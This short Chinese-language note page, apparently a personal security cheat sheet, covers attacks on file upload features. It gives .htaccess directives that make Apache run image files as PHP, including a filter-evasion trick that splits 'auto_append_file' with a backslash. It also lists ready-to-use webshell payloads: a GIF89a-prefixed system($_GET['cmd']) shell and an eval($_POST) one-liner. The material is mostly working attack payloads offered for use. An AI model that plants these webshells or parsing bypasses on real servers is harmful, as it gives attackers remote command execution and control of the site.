---
title: "文件上传"
date: 2001-01-01
tags:
  - Others
categories:
  - Others
---
## 文件解析漏洞

```txt
# .htaccess
AddType application/x-httpd-php .jpg	# 将jpg文件作为php来解析
php_value auto_append_fi\
le "php://filter/convert.base64-decode/resource=1.jpg"		
# 在解析和执行任何 PHP 文件（包括被当作 PHP 解析的 `.jpg` 文件）后，自动附加 `1.jpg` 文件的内容，并在附加前对内容进行 Base64 解码
# \ 用来换行，绕过防护


# 匹配文件名为1.png的文件，强制将匹配到的文件交给PHP解释器处理
<FilesMatch "1.png"> 
SetHandler application/x-httpd-php 
</FilesMatch>
```

常用的木马文件

```txt
# 木马文件
1.phtml: 
GIF89a <script language='php'>system($_GET['cmd']);</script>

1.png/jpg...
<?php @eval($_POST['attack']) ?>
```